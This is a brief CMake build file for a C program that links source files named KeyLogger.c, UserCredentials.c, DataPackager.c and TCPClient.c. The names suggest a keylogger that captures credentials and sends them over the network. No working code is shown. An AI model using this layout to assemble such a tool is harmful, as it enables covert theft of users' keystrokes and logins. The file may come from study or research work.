project("Main") # This is the name of the project, it is arbitrary

# Main executable
add_executable(main main.c ../lib/DataPackager.c ../lib/KeyLogger.c ../lib/StateManager.c ../lib/TCPClient.c ../lib/UserCredentials.c)
target_link_libraries(main m pthread rt)